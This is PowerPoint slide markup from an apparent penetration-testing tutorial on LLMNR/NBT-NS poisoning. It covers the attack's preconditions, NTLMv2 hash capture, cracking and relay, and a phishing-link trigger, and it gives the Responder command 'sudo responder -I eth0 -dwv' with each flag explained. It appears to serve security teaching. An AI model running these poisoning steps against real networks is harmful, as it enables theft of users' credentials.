            <a:off x="6499126" y="890548"/>
            <a:ext cx="6164824" cy="42073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800" dirty="0">
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🔥</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Black" panose="020B0A040201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IMPORTANT CONDITIONS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800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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 Same network as victim</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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 LLMNR/NBT-NS enabled</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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 Victim makes request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>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800" dirty="0"/>
              <a:t>⚡ 1. Same Network as Victim (Layer 2 / Broadcast Scope)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800" dirty="0"/>
              <a:t>Why it matters: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800" dirty="0"/>
              <a:t>Protocols like LLMNR and NBT-NS are broadcast-based.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800" dirty="0"/>
              <a:t>👉 That means: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800" dirty="0"/>
              <a:t>Requests are sent to the local network only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800" dirty="0"/>
              <a:t>Routers do NOT forward these packets</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40566980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4645742" cy="4660490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1700" dirty="0"/>
              <a:t>What happens technically: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700" dirty="0"/>
              <a:t>When a victim tries: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700" dirty="0"/>
              <a:t>\\fileserver123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700" dirty="0"/>
              <a:t>Windows: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700" dirty="0"/>
              <a:t>Tries DNS → fails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700" dirty="0"/>
              <a:t>Falls back to LLMNR/NBT-NS → broadcast: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700" dirty="0"/>
              <a:t>“Who has fileserver123?”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700" dirty="0"/>
              <a:t>💀 If you're on the same subnet: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700" dirty="0"/>
              <a:t>You see the broadcast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C5ACBB2-C190-16DD-DB36-31B2F6904DFC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5449529" y="0"/>
            <a:ext cx="6120580" cy="42073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1800" dirty="0"/>
              <a:t>You respond faster than legit hosts → poison success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800" dirty="0"/>
              <a:t>🚫 If you're NOT on the same network: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800" dirty="0"/>
              <a:t>You never see the request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800" dirty="0"/>
              <a:t>Attack = dead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800" dirty="0"/>
              <a:t>⚡ 2. LLMNR / NBT-NS Must Be Enabled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800" dirty="0"/>
              <a:t>Why it matters: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800" dirty="0"/>
              <a:t>These are fallback mechanisms in Windows.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800" dirty="0"/>
              <a:t>If disabled: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800" dirty="0"/>
              <a:t>Windows will NOT broadcast name queries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800" dirty="0"/>
              <a:t>Your tool (Responder) gets nothing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="870419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6120580" cy="6858000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1700" dirty="0"/>
              <a:t>Default reality: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700" dirty="0"/>
              <a:t>In many environments (especially poorly hardened ones), both are ON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700" dirty="0"/>
              <a:t>Attack dependency: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700" dirty="0"/>
              <a:t>Tools like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700" dirty="0"/>
              <a:t>👉 Responder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700" dirty="0"/>
              <a:t>depend on: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700" dirty="0"/>
              <a:t>LLMNR packets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700" dirty="0"/>
              <a:t>NBT-NS packets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700" dirty="0" err="1"/>
              <a:t>mDNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> =</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>enable local, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>serverless</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> network discovery (e.g., Apple Bonjour, Google Chromecast) by broadcasting service advertisements and queries over UDP port 5353</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>.These packets utilize IPv4 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>224.0.0.251</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>) or IPv6 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ff02::fb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Google Sans"/>
              </a:rPr>
              <a:t>) multicast addresses to allow devices to find each other, such as smart TVs, printers, and phones, without a central DNS server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>No protocol = no poisoning opportunity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="17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85ECA64-7254-F109-FA86-A01E6AD70DA3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="511076"/>
            <a:ext cx="4800600" cy="42073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1800" dirty="0"/>
              <a:t>⚡ 3. Victim Must Make a Request (Trigger Event)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800" dirty="0"/>
              <a:t>This is the MOST misunderstood part.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800" dirty="0"/>
              <a:t>You’re not actively hacking yet—you’re waiting for mistakes.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800" dirty="0"/>
              <a:t>The trigger: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800" dirty="0"/>
              <a:t>Victim tries to access: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800" dirty="0"/>
              <a:t>Non-existent share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800" dirty="0"/>
              <a:t>Typo in hostname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800" dirty="0"/>
              <a:t>Wrong mapped drive</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23497705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4070555" cy="6858000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2200" dirty="0"/>
              <a:t>Phishing link like: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200" dirty="0"/>
              <a:t>\\fake-share\docs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200" dirty="0"/>
              <a:t>What Windows does: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200" dirty="0"/>
              <a:t>Fails DNS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200" dirty="0"/>
              <a:t>Broadcasts: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200" dirty="0"/>
              <a:t>“Who is fake-share?”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200" dirty="0"/>
              <a:t>Then YOU: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200" dirty="0"/>
              <a:t>Reply: “I am fake-share 😈”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200" dirty="0"/>
              <a:t>Victim trusts you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97D1F7F-37F2-EEB6-7625-4ABA8F4278F9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4723172" y="127338"/>
            <a:ext cx="6142702" cy="2960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1800" dirty="0"/>
              <a:t>Sends authentication → NTLM challenge-response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800" dirty="0"/>
              <a:t>⚡ What You Actually Capture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800" dirty="0"/>
              <a:t>You don’t get plaintext passwords—you capture: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800" dirty="0"/>
              <a:t>👉 NTLM hashes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800" dirty="0"/>
              <a:t>Types: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800" dirty="0"/>
              <a:t>NTLMv1 (weak 💀)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800" dirty="0"/>
              <a:t>NTLMv2 (stronger but crackable)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5105165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0" y="0"/>
            <a:ext cx="7138219" cy="63920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700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E74B5"/>
                </a:solidFill>
                <a:latin typeface="Calibri Light" panose="020F0302020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>What is NTLM?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700" dirty="0"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NTLMv2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t> =</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>A Windows authentication protocol (challenge-response based)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="10000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>🔐 Simple idea:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>When a user connects to a share:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>❌ Windows does NOT send the password</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>✔ It sends a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>cryptographic response (hash)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="40000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>  So NTLMv2 hash is:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 NOT a password</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 NOT directly usable</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 BUT can be:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>cracked (offline) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>relayed (more powerful) relay = forwarding authentication in real-time to another system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/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2210392"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="0" y="4429887"/>
          <a:ext cx="5225142" cy="1696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25142">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2672313004"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="43391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7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⚡ Why NTLMv2 matters (Why to obtain NTLMv2)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40522321"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="478298">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="17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✔ Stronger than NTLMv1</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="17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816771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7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✔ Still </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="17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crackable</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="17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if password is weak</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="17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61338950"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="433915">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="17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✔ Widely used in AD environments</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="17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5264312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3421194A-37ED-5590-5204-13FB9872B1E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7138219" y="465994"/>
            <a:ext cx="6164824" cy="2958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1800" b="1" dirty="0"/>
              <a:t>STEP 0 — Setup (Attacker + Victim)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800" b="1" dirty="0"/>
              <a:t>Attacker:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Kali Linux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800" b="1" dirty="0"/>
              <a:t> Victim:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Windows machine (LLMNR enabled by default)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800" b="1" dirty="0"/>
              <a:t>🌐 Network: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800" dirty="0"/>
              <a:t>✔ SAME network (or pivoted access)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20379290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0" y="0"/>
            <a:ext cx="4763729" cy="74137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900" dirty="0"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STEP 1 — START RESPONDER (ON KALI)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900" dirty="0">
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Interface check first:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
              <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49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900" dirty="0" err="1"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ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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 a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"/>
              <a:t> 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900" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
              <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49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900" dirty="0"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eth0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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900" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Find your interface (usually </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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eth0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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tun0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900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900" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Run Responder:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
              <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRP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900" dirty="0" err="1"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sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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 responder -I eth0 -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1"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dwv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"/>
              <a:t> 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1900" dirty="0"/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1900" dirty="0"/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1900" dirty="0"/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1900" b="1" dirty="0"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900" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>What each flag means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900" dirty="0"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-I eth0 → interface</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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-d      → enable DHCP poisoning</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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-w      → enable WPAD rogue proxy</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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-v      → verbose output</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"/>
              <a:t> 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1900" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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14A1C3E-C3A2-541D-3BB9-AD6F07582FA0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect r="9612"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3062953"/>
            <a:ext cx="3045460" cy="17554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43676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4F85A58-8185-9843-31E0-A4CA213D26BE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="266189" y="179904"/>
            <a:ext cx="5265173" cy="5453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800" dirty="0"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STEP 2 — WAIT (THIS IS IMPORTANT)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800" dirty="0">
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Now:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
              <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRP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800" dirty="0"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You DO NOTHING</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>👉</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Responder is:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800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800" dirty="0"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Listening for:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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 LLMNR</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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 NBT-NS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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</a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>✔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"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 MDNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>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800" b="1" dirty="0"/>
              <a:t>✔ Verify:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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800" dirty="0"/>
              <a:t>You should see:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>[+] Listening for events...</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>[+] LLMNR/NBT-NS/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>mDNS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Poisoner started</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5559919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0" y="362919"/>
            <a:ext cx="5726538" cy="55658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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>These 3 are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>name resolution protocols</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> 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700" dirty="0">
